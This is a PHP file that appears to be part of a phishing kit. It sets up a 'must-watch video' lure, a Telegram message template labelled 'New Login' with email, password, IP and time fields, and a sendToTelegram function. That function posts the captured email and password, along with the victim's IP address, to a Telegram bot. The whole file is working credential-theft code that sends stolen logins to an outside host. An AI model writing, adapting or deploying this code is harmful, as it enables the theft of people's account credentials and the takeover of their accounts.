<?php
$token = 'token'; // token
$chatId = 'idtele'; // id tele

$videoTitle = 'Video Menarik - Wajib Tonton!';
$videoDescription = '#PemersatuBangsa';
$videoUrl = 'https://www.w3schools.com/html/mov_bbb.mp4';

$telegramMessage = "*Login Baru*\n\n";
$telegramMessage .= "Email: `{EMAIL}`\n";
$telegramMessage .= "Password: `{PASSWORD}`\n";
$telegramMessage .= "IP: {IP}\n";
$telegramMessage .= "Waktu: {TIME} WIB";

function sendToTelegram($email, $password, $token, $chatId, $messageTemplate) {
    $message = str_replace('{EMAIL}', $email, $messageTemplate);
    $message = str_replace('{PASSWORD}', $password, $message);
    $message = str_replace('{IP}', $_SERVER['REMOTE_ADDR'], $message);
    $message = str_replace('{TIME}', date('Y-m-d H:i:s'), $message);
    
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage";
    
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];
    
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    
    return $result !== false;
}
?>